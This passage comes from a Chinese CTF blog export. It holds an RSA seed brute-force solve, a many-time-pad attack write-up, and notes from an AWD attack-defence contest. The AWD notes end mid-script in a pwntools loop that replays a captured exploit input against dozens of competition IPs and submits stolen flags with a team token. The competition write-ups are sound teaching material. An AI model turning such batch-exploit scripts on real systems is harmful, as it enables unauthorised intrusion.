= <span class="built_in">pow</span>(m2,e2,n2)</span><br><span class="line"><span class="built_in">print</span>(n2)</span><br><span class="line"><span class="built_in">print</span>(c2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#nspan></span><br><span class="line"><span class="comment">#cspan></span><br><span class="line"><span class="comment">#n2=15155267112260254814859334094046172735826002259080171081726998162357946701645037659523881592272031544049749021927125983252197909993392636398184049160807707719999605547760868696059871234441249045293267592302009677249269002811886149589869652213333369608947939768457152200437978105250737118847430275142343554191304134468404921824671763164876924921101985937224297479095246132228051655664880892772136476378294042631659251586654877292836243536438334288184387617801131434535466414123998495813296765847561162680781100446656391077184870802746066619879552452560641945080540683058930700833439189784657690146144976738557801495769</span></span><br><span class="line"><span class="comment">#c2=2468578221703379861458008098241051507850837382948845085288946175636556753744182763176189585173648323464054032011039944322939163396161712722541432975739789351064988098201326803586126788175259878398963744821667593495161587855894677387881240566285601934559118064797092685909593247713834262369686831071897653756217369182373679039639016628932948775518889507209432291038498366540263588850133348471811624348709494110881127292350302658720685976197632586315945770832849119141593343924518836983738868912332048462058640564551286493338707636203013048694776131295632886983835291684044170004544049944003732133038154121113518892438</span></span><br></pre></td></tr></table></figure>

<h3 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h3><p>有意思的题目，ilike</p>
<p>主要是利用了伪随机的特性，只要找到种子seed，伪随机就能找到规律</p>
<p>不难，保留了五位小数，直接爆破，我愿称Brute-force为最强</p>
<p>还有就是时间戳之间的转换，csdn上找到有博主这样转，贴个链接<br><a href="https://blog.csdn.net/google19890102/article/details/51355282">https://blog.csdn.net/google19890102/article/details/51355282</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:UTF-8</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">dt = <span class="string">&quot;2016-05-05 20:28:54&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#转换成时间数组</span></span><br><span class="line">timeArray = time.strptime(dt, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line"><span class="comment">#转换成时间戳</span></span><br><span class="line">timestamp = time.mktime(timeArray)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> timestamp</span><br></pre></td></tr></table></figure>

<h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># 先求解hint</span></span><br><span class="line">n1 = <span class="number">449389319572014470973230701130712522617269811294117721031111991008431585050360094769229957883125144692171901233101564003762866045169460601700254891441878998743810037070537170855056466702105713343963726437141651081516150688905082129849562489646846756872586122801890652177495174154676725874072596207108180178755008058522945203093993733331873167443162263746938403044201113440457668163574342481361454421154163291201432319013385234751292922268166299917246608164679144459355173725895117315662317330324505156929077922670671914823996700321766811999551043586214703010131467697982137884162143358399786007967117340789211505834848813471803797101083738140019127129356248286854522464787917597152171952002118368747491099723673529923018951195522714900400225757160886780159504182902140132857743474716967975019342128486236748643365288547828026395873270777532526144687248477070253203339428149026199554962987646174586568177797380361174318868448467648171416588868990979461995030684403161898497550408697577695094783000808003197203603068043364687265824456069673330314452567416143754983137647607219859034406220590219587869898727679465514015732749105798134650890143215022311113143974714405713221391896497966231925409438383535066648782822255201778169275281703</span></span><br><span class="line">c1 = <span class="number">401489532945377793610793684722119773544780301600066410745513430092738470870254235710677331662917458735216486816223654944666672512914069274195244871184555059503843032370247894353363929996813688885280857203101709839776411016868985545599944237897372546401710041402579657231598311853522596463296090177664832759103736040102780428858301594805054838853076238331373482465072766841859415172741329175814259920949065993852870119473982972519779774470087935094963692097673607052443800723940091927016071427616754775915389245004208964143538205414854133746775614714447645057516665851780628694481268861808310238416724971673673850671343955386054575121362377868533055225219936712709474708031320743579595394353267596208729974198335174409673325772679039734706841988107519076516144633301371408301344929883397145523702189363308278963683356102257750758738297143036846718834812930796483716912661191147997005333798193659914573185697664706530774799114804036170190966523509331071964600280701252628276934131586398546602582672541075820188456265586487083315680880306767899236884202195162421559689536613740573005749847000477194096162091015847386298782974979446476432285118251267512895876728805199744415821498028998351171848530921695254428997423725875714923331577073</span></span><br><span class="line">n2 = <span class="number">15155267112260254814859334094046172735826002259080171081726998162357946701645037659523881592272031544049749021927125983252197909993392636398184049160807707719999605547760868696059871234441249045293267592302009677249269002811886149589869652213333369608947939768457152200437978105250737118847430275142343554191304134468404921824671763164876924921101985937224297479095246132228051655664880892772136476378294042631659251586654877292836243536438334288184387617801131434535466414123998495813296765847561162680781100446656391077184870802746066619879552452560641945080540683058930700833439189784657690146144976738557801495769</span></span><br><span class="line">c2 = <span class="number">2468578221703379861458008098241051507850837382948845085288946175636556753744182763176189585173648323464054032011039944322939163396161712722541432975739789351064988098201326803586126788175259878398963744821667593495161587855894677387881240566285601934559118064797092685909593247713834262369686831071897653756217369182373679039639016628932948775518889507209432291038498366540263588850133348471811624348709494110881127292350302658720685976197632586315945770832849119141593343924518836983738868912332048462058640564551286493338707636203013048694776131295632886983835291684044170004544049944003732133038154121113518892438</span></span><br><span class="line"></span><br><span class="line">e2 = <span class="number">196611</span></span><br><span class="line">p2 = <span class="number">123106730572541218855605566021385436071765753262738029208958530903965781875227909642974714736010685670143580347743415357832685249865725150245921795069888441073829479429807586105897472912969591388975228566729202050232896382465835682108694199213251295570982696527682862415340158808173324606996424204650675862831</span></span><br><span class="line">q2 = <span class="number">123106730572541218855605566021385436071765753262738029208958530903965781875227909642974714736010685670143580347743415357832685249865725150245921795069888441073829479429807586105897472912969591388975228566729202050232896382465835682108694199213251295570982696527682862415340158808173324606996424204650675860599</span></span><br><span class="line"><span class="comment"># hint = long_to_bytes(pow(c2, invert(e2, (p2-1)*(q2-1)), n2))</span></span><br><span class="line"><span class="comment"># print(hint)</span></span><br><span class="line"><span class="comment"># hint = &#x27;time.struct_time(tm_year=2021, tm_mon=4, tm_mday=28, tm_hour=20, tm_min=42, tm_sec=6, tm_wday=2, tm_yday=118, tm_isdst=0)3.1603143215179443&#x27;</span></span><br><span class="line"></span><br><span class="line">e1 = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">local_time = <span class="string">&#x27;time.struct_time(tm_year=2021, tm_mon=4, tm_mday=28, tm_hour=20, tm_min=42, tm_sec=6, tm_wday=2, tm_yday=118, tm_isdst=0)&#x27;</span></span><br><span class="line">dt = <span class="string">&quot;2021-04-28 20:42:06&quot;</span></span><br><span class="line"><span class="comment">#转换成时间数组</span></span><br><span class="line">timeArray = time.strptime(dt, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line"><span class="comment">#转换成时间戳</span></span><br><span class="line">timestamp = time.mktime(timeArray)</span><br><span class="line"><span class="comment"># print(timestamp)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prime</span>(<span class="params">bits, new_p</span>):</span></span><br><span class="line">    x = <span class="number">1</span></span><br><span class="line">    random.seed(<span class="built_in">round</span>(new_p, <span class="number">5</span>))</span><br><span class="line">    x = random.getrandbits(bits)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t = timestamp</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    t -= <span class="number">0.00001</span></span><br><span class="line">    <span class="built_in">print</span>(t)</span><br><span class="line">    hint = <span class="string">&quot;&quot;</span></span><br><span class="line">    a1 = time.time()</span><br><span class="line">    p = get_prime(<span class="number">2048</span>, t)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_prime(p):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n1 % p != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    q = n1 // p</span><br><span class="line">    d = invert(e1, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    m = <span class="built_in">pow</span>(c1, d, n1)</span><br><span class="line">    tmp_flag = long_to_bytes(m)</span><br><span class="line">    <span class="keyword">if</span> tmp_flag.startswith(<span class="string">b&#x27;flag&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(tmp_flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>flag呢？没有flag，寄几跑</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210527 MTCTF2021Crypto方向部分复现</title>
    <url>/posts/43deb916/</url>
    <content><![CDATA[<img alt="easy_RSA-37a4a203.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/easy_RSA-37a4a203.png" width="" height="" >

<p>看了下日期，又不能快乐地刷题了</p>
<p>那天竟然被宁波的比赛耽误，SSGYZTL，错过了美团，赛后复现一下</p>
<span id="more"></span>

<h1 id="20210527-MTCTF2021Crypto方向部分复现"><a href="#20210527-MTCTF2021Crypto方向部分复现" class="headerlink" title="20210527 MTCTF2021Crypto方向部分复现"></a>20210527 MTCTF2021Crypto方向部分复现</h1><h2 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h2><p>第一层套了一个padding，比较常规不再赘述</p>
<p>第二层是多次一加密（Many Time Pad），大致的加密思路就是每次都用相同的key去加密明文，注意一次一密（One Time Pad）的区别</p>
<h3 id="第二层的题目描述"><a href="#第二层的题目描述" class="headerlink" title="第二层的题目描述"></a>第二层的题目描述</h3><p>输入第一层的密码，压缩包文件里的内容是这样的，有十二个十六进制的数字</p>
<img alt="easy_RSA-a8cb1b59.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/easy_RSA-a8cb1b59.png" width="" height="">

<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>话不多说，直接去找脚本，大致的思路是按照这位师傅的博客<a href="https://www.ruanx.net/many-time-pad/">https://www.ruanx.net/many-time-pad/</a>来的，讲得太好了</p>
<p>主要就是两个密文异或，可以把相同的key去掉，这样就相当于两个明文异或了<br>（这里注意尽管OTP的安全系数相当高，但是由于密码分发的问题，难以实现，所以这里当成MTP来做了）</p>
<p>至于攻击的手段，时间有限先不展开；有了脚本之后，并不代表一切的终结，我们还需要做一下操作</p>
<h3 id="脚本改编"><a href="#脚本改编" class="headerlink" title="脚本改编"></a>脚本改编</h3><p>首先当然是把读文件里的文件名换一下啦，注意最好删去逗号</p>
<p>然后直接运行会报错，因为密文不等长，可以先把第六和第十二个密文填充和其他密文等长的长度</p>
<p>第一次运行结果是这样的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">N=w -ou need to u&#125;e the k3</span><br><span class="line">o%n 2lag as the kky of On8</span><br><span class="line"> im1 Pad Encryptgn. Now )</span><br><span class="line">h3t -ou have passkd the p/</span><br><span class="line">e$io!s RSA test, zhis cha1</span><br><span class="line">l7ng1 is not partgcularly</span><br><span class="line">p&gt;ea&#x27;e get the tr&#123;e messa:</span><br><span class="line">d;ff=cult for you  It is 7</span><br><span class="line">u!t &#x27;imple encrypzion.I h2</span><br><span class="line">p7 y;u can solve zhis pro?</span><br><span class="line">l7m %uickly and gkt the c2</span><br><span class="line">r ec  answer succksslyp@d</span><br><span class="line">b&#x27;f&gt;ag/it_1s_P@dd1nQ@nd_p@d &#x27;</span><br></pre></td></tr></table></figure>

<p>（？？？小朋友你是不是有很多问号）</p>
<p>为什么会出现乱码和明文混合的现象呢，这个要和攻击的原理挂钩，暂时也不展开</p>
<p>而我们所要做的第二步就是愉快的猜字母环节，将很明显错地方的字母给替换成对的，替换的函数师傅已经写好了，直接用就好</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">know</span>(<span class="params">p_index, p_pos, ch</span>):</span></span><br><span class="line">    msg[p_index, p_pos] = <span class="built_in">ord</span>(ch)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != p_index:</span><br><span class="line">            msg[x][p_pos] = xo.strxor(c[x], c[p_index])[p_pos] ^ <span class="built_in">ord</span>(ch)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 需要手动更改的就是这个地方，按照意思，替换你确定的字母</span></span><br><span class="line">know(<span class="number">0</span>, <span class="number">1</span>, <span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">4</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">12</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">13</span>, <span class="string">&#x27;t&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">17</span>, <span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">19</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">know(<span class="number">1</span>, <span class="number">25</span>, <span class="string">&#x27;e&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>最后运行得到完整的明文和flag，至于之前的在末尾填充0，也是试出来</p>
<p>贴一下完整脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto.Util.strxor <span class="keyword">as</span> xo</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ischr</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">infer</span>(<span class="params">p_index, p_pos</span>):</span></span><br><span class="line">    <span class="keyword">if</span> msg[p_index, p_pos] != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    msg[p_index, p_pos] = <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != p_index:</span><br><span class="line">            msg[x][p_pos] = xo.strxor(c[x], c[p_index])[p_pos] ^ <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dat = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_space</span>():</span></span><br><span class="line">    <span class="keyword">for</span> t_index, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(c):</span><br><span class="line">        res = [xo.strxor(x, y) <span class="keyword">for</span> y <span class="keyword">in</span> c <span class="keyword">if</span> x != y]</span><br><span class="line">        f = <span class="keyword">lambda</span> t_pos: <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(ischr, [s[t_pos] <span class="keyword">for</span> s <span class="keyword">in</span> res])))</span><br><span class="line">        cnt = [f(t_pos) <span class="keyword">for</span> t_pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="keyword">for</span> t_pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">            dat.append((f(t_pos), t_index, t_pos))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第十二行和第六行长度不一，末尾填充0就好了</span></span><br><span class="line">c = [codecs.decode(x.strip().encode(), <span class="string">&#x27;hex&#x27;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;t3mpt.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()]</span><br><span class="line"></span><br><span class="line">msg = np.zeros([<span class="built_in">len</span>(c), <span class="built_in">len</span>(c[<span class="number">0</span>])], dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">get_space()</span><br><span class="line"></span><br><span class="line">dat = <span class="built_in">sorted</span>(dat)[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> w, index, pos <span class="keyword">in</span> dat:</span><br><span class="line">    infer(index, pos)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">know</span>(<span class="params">p_index, p_pos, ch</span>):</span></span><br><span class="line">    msg[p_index, p_pos] = <span class="built_in">ord</span>(ch)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != p_index:</span><br><span class="line">            msg[x][p_pos] = xo.strxor(c[x], c[p_index])[p_pos] ^ <span class="built_in">ord</span>(ch)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 需要手动更改的就是这个地方，按照意思，替换你确定的字母</span></span><br><span class="line">know(<span class="number">0</span>, <span class="number">1</span>, <span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">4</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">12</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">13</span>, <span class="string">&#x27;t&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">17</span>, <span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">19</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">know(<span class="number">1</span>, <span class="number">25</span>, <span class="string">&#x27;e&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> x]) <span class="keyword">for</span> x <span class="keyword">in</span> msg]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 其实只需要知道一条正确的明文就够了，key=C1^M1</span></span><br><span class="line">key = xo.strxor(c[<span class="number">0</span>], <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> msg[<span class="number">0</span>]]).encode())</span><br><span class="line"><span class="built_in">print</span>(key)</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>我也不知道为什么抄别人的还要写WP，另外找到一个py2的脚本，但是看不懂，他那个好像可以是密文不等长的，先贴一下链接，后续再研究<br><a href="https://lazzzaro.github.io/2020/11/07/crypto-%E6%B5%81%E5%AF%86%E7%A0%81/">https://lazzzaro.github.io/2020/11/07/crypto-%E6%B5%81%E5%AF%86%E7%A0%81/</a></p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>OTP一次一密</tag>
      </tags>
  </entry>
  <entry>
    <title>20210617 记国赛线下AWD选拔赛</title>
    <url>/posts/3a78d3e0/</url>
    <content><![CDATA[<p>我是一块砖，需要就往哪里搬。震惊，密码师傅零基硬刚PWN，结果被凑得鼻青脸肿</p>
<img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/记国赛线下AWD选拔赛-11a8defc.png" alt="昂？"/>

<p>三个月后回头看，发现自己真的是太菜了，别的密码师傅都可以国赛中打得很自在，自己却被一天罚站。学习的面可以广啊。做这一行，<strong>只能有长板和无数个中板</strong></p>
<span id="more"></span>

<h1 id="20210617-记国赛线下AWD选拔赛"><a href="#20210617-记国赛线下AWD选拔赛" class="headerlink" title="20210617 记国赛线下AWD选拔赛"></a>20210617 记国赛线下AWD选拔赛</h1><h2 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h2><p>当时的放在桌子上的文件</p>
<img alt="README-7b68301e.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-7b68301e.png" width="" height="">

<p>点开那个网络配置，然后双击ipv4，自动获取ip，然后查看下ipconfig就好了</p>
<img alt="README-2be6a323.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-2be6a323.png" width="" height="">

<h2 id="PWN文件的下载"><a href="#PWN文件的下载" class="headerlink" title="PWN文件的下载"></a>PWN文件的下载</h2><blockquote>
<p>使用sftp</p>
</blockquote>
<h3 id="步骤一：连接靶机"><a href="#步骤一：连接靶机" class="headerlink" title="步骤一：连接靶机"></a>步骤一：连接靶机</h3><p>有一种是输入密码的</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sftp -p [端口号] 用户名@IP地址</span><br></pre></td></tr></table></figure>

<p>输入密码，进入端口</p>
<p>还有一种是用私钥文件认证的</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sftp -i [私钥文件] 用户名@IP地址</span><br></pre></td></tr></table></figure>

<p><em>这次遇到的是后一种，输入密码的听说是相同的、或者是弱密码可以抢先别人一步拿到密码并且改掉，但是用RSA签名认证的应该就不会出现这种情况</em></p>
<h3 id="步骤二：文件下载和上传"><a href="#步骤二：文件下载和上传" class="headerlink" title="步骤二：文件下载和上传"></a>步骤二：文件下载和上传</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">lpwd  <span class="comment"># 查看本地文件路径lpath</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">pwd</span>   <span class="comment"># 查看远程路径path</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">get lpath path    <span class="comment"># 下载文件</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">put path          <span class="comment"># 上传文件</span></span><br></pre></td></tr></table></figure>

<p>或说这两个我从来没有成功过，当时比赛是用图形化界面的ssh拉下来的，使用相对也比较简单</p>
<img alt="README-a08a1141.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-a08a1141.png" width="" height="">

<blockquote>
<p>ssh</p>
</blockquote>
<p>操作的过程和sftp差不多，因为ssh内含sftp协议，比如连接的命令就是</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh -i [私钥文件] 用户名@IP地址</span><br></pre></td></tr></table></figure>

<h2 id="当PWN遇上流量分析"><a href="#当PWN遇上流量分析" class="headerlink" title="当PWN遇上流量分析"></a>当PWN遇上流量分析</h2><p>写了两个利用攻击来源的流量包分析出的还有点用处的手动化脚本</p>
<p>有了第一天的经验，第二天直接分析流量包。而且比赛开始没几分钟，就有队伍PWN题打过来了，拿到packages看看</p>
<p>追踪TCP流</p>
<img alt="记国赛线下AWD选拔赛-f9a23239.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/记国赛线下AWD选拔赛-f9a23239.png" width="" height="">

<p>这是PWN2的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">12</span><br><span class="line">++++++++++X</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DJR</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这是PWN3的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">1</span><br><span class="line">0</span><br><span class="line">985</span><br><span class="line">10</span><br><span class="line">985</span><br><span class="line">0</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">2</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa6</span><br><span class="line">flappybird666666</span><br></pre></td></tr></table></figure>

<p>打PWN2的脚本，我写的主要有几个问题</p>
<ol>
<li><p>不能每隔十分钟自动跑，新的一轮要手动跑几次，但是后面也就是在跑这两个脚本了，然后改改一些小的地方，没别的事做，所以还好</p>
</li>
<li><p>有一些IP是修好的，或者是即使没有修好，输入输出流之间可能会有EOF错误（PWN师傅说要sleep一下，后续研究）导致有些会卡住程序运行，所以在手跑的时候，需要将连接不好又不能跳过的IP去掉一下</p>
<img alt="README-6d5540d6.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-6d5540d6.png" width="" height="" ></li>
</ol>
<p>这个脚本大概每次会有20~35个flag提交成功，因为很多队伍，包括我们的一队都修好</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">token = <span class="string">&#x27;4vvfuKfBbHtTtEATCnwV3U4DxQVd5SwEHB8uxruSb4Hmj&#x27;</span></span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit_flag</span>(<span class="params">flag1</span>):</span></span><br><span class="line">    url_flag = <span class="string">&#x27;http://10.16.18.1/api/v1/att_def/web/submit_flag/?event_id=14&#x27;</span></span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;flag&#x27;</span>: flag1,</span><br><span class="line">        <span class="string">&#x27;token&#x27;</span>: token</span><br><span class="line">    &#125;</span><br><span class="line">    req = requests.post(url=url_flag, data=data, proxies=proxies)</span><br><span class="line">    <span class="built_in">print</span>(req.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug = <span class="literal">False</span></span><br><span class="line">x64 = <span class="literal">True</span></span><br><span class="line">file = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">libc_file = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">ip = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">    <span class="keyword">if</span> i != <span class="number">50</span>:</span><br><span class="line">        ip.append(<span class="string">&#x27;172.35.&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;.17&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ports = <span class="number">9999</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="keyword">if</span> x64:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline()</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recv()</span><br><span class="line">rn = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ipi <span class="keyword">in</span> ip:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> ipi <span class="keyword">in</span> [<span class="string">&#x27;172.35.7.17&#x27;</span>]:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        io = remote(ipi, ports)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;12&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;++++++++++X&#x27;</span>)</span><br><span class="line">        